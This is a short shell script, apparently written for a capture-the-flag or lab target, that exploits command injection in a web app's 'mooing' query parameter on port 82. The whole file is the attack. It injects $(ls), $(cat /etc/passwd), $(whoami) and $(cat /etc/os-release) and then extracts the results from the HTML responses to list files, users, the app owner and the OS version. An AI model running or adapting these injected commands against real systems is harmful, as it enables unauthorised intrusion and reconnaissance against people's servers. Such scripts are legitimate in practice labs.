#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define host IP ( the machine to attack ) and remote IP ( the machine which supports the attack )
target_ip="10.10.210.85"
attack_ip="10.10.30.237"

# Prepare environment
mkdir /work/ 2>/dev/null

# Listing root files
echo "1 - LISTING ROOT FILES"
curl -s -X GET "http://$target_ip:82/?cow=default&mooing=%24%28ls%29" > /work/ls.html
echo "--> Files are : $(awk 'BEGIN { RS="<pre>|</pre>"; FS="\n" } NR % 2 == 0 { print }' /work/ls.html)"

# Listing users
echo "2 - LISTING USERS"
curl -s -X GET "http://$target_ip:82/?cow=default&mooing=%24%28cat+%2Fetc%2Fpasswd%29" > /work/passwd.html
echo "--> Users are : $(awk 'BEGIN { RS="<pre>|</pre>"; FS="\n" } NR % 2 == 0 { print }' /work/passwd.html)"

# Current user
echo "3 - GETTING APP OWNER"
curl -s -X GET "http://$target_ip:82/?cow=default&mooing=%24%28whoami%29" > /work/whoami.html
echo "--> App run as : $(awk 'BEGIN { RS="<pre>|</pre>"; FS="\n" } NR % 2 == 0 { print }' /work/whoami.html)"

# Linux release
echo "4 - GETTING LINUX VERSION"
curl -s -X GET "http://$target_ip:82/?cow=default&mooing=%24%28cat+%2Fetc%2Fos-release%29" > /work/release.html
echo "--> Linux version is : $(awk 'BEGIN { RS="<pre>|</pre>"; FS="\n" } NR % 2 == 0 { print }' /work/release.html)"